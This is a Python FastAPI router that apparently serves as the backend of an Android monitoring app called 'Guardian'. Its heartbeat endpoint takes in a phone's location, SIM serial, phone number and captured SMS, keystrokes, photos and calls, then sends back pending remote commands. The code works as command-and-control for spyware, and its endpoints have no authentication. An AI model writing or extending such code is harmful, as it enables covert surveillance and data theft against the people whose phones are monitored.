from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional, List
from datetime import datetime
import json
from app.database import get_db
from app.models.device import Device
from app.models.command import Command

router = APIRouter(prefix="/v1/devices", tags=["devices"])

class CapturedItem(BaseModel):
    type: str  # sms, keystroke, photo, call
    data: str  # JSON string with the actual data
    timestamp: int

class DeviceHeartbeat(BaseModel):
    device_id: str
    user_id: str
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    accuracy: Optional[float] = None
    battery: Optional[int] = None
    wifi_name: Optional[str] = None
    ip_address: Optional[str] = None
    sim_serial: Optional[str] = None
    phone_number: Optional[str] = None
    captured_data: Optional[List[CapturedItem]] = None

@router.post("/heartbeat")
async def heartbeat(request: DeviceHeartbeat, db: Session = Depends(get_db)):
    """Guardian sends heartbeat + captured data. Returns pending commands."""
    
    # Find or create device
    device = db.query(Device).filter(
        Device.device_id == request.device_id,
        Device.user_id == request.user_id
    ).first()
    
    if not device:
        device = Device(
            user_id=request.user_id,
            device_id=request.device_id,
            device_name="Android Device"
        )
        db.add(device)
        db.flush()
    
    # Update device
    device.last_latitude = request.latitude
    device.last_longitude = request.longitude
    device.last_accuracy = request.accuracy
    device.last_battery = request.battery
    device.last_wifi = request.wifi_name
    device.last_ip = request.ip_address
    device.sim_serial = request.sim_serial
    device.phone_number = request.phone_number
    device.is_online = True
    device.last_seen = datetime.utcnow()
    
    # Store captured data as commands with results
    if request.captured_data:
        for item in request.captured_data:
            try:
                data_dict = json.loads(item.data) if isinstance(item.data, str) else item.data
            except:
                data_dict = {"raw": str(item.data)}
            
            cmd = Command(
                device_id=device.id,
                command_type=item.type,
                command_data=json.dumps(data_dict),
                status="executed",
                result=json.dumps(data_dict),
                executed_at=datetime.utcfromtimestamp(item.timestamp / 1000) if item.timestamp else datetime.utcnow()
            )
            db.add(cmd)
    
    # Get pending commands
    pending = db.query(Command).filter(
        Command.device_id == device.id,
        Command.status == "pending"
    ).all()
    
    commands_list = []
    for cmd in pending:
        commands_list.append({
            "id": cmd.id,
            "command_type": cmd.command_type,
            "command_data": json.loads(cmd.command_data) if isinstance(cmd.command_data, str) else cmd.command_data
        })
        cmd.status = "sent"
    
    db.commit()
    
    return {
        "status": "ok",
        "device_id": device.id,
        "commands": commands_list,
        "command_count": len(commands_list)
    }

@router.get("/{user_id}")
async def get_devices(user_id: str, db: Session = Depends(get_db)):
    devices = db.query(Device).filter(Device.user_id == user_id).all()
    return [d.to_dict() for d in devices]
